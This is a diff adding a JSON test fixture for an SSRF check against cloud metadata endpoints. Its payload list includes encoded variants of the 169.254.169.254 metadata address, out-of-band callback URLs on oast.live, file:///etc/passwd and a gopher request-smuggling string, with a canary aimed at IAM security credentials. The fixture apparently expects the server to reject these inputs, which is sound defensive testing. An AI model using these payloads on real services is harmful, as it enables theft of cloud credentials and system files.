@@ -1,0 +1,19 @@
+{
+  "target": "https://httpbin.org/post",
+  "finding": "ssrf_cloud_metadata",
+  "parameter": "url",
+  "payloads": [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://2852039166/latest/meta-data/",
+    "http://0251.0376.0251.0376/latest/meta-data/",
+    "http://[::ffff:169.254.169.254]/latest/meta-data/",
+    "http://oob-tc05.d6tdc57qeopnki5c9k0gb1sohs38y9r1h.oast.live/latest/meta-data/",
+    "http://oob-tc06.d6tdc57qeopnki5c9k0gb1sohs38y9r1h.oast.live/",
+    "http://0.0.0.0/latest/meta-data/",
+    "http://169.254.170.2/latest/meta-data/",
+    "file:///etc/passwd",
+    "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0"
+  ],
+  "canary_string": "iam/security-credentials",
+  "expected_rejection_code": 400
+}
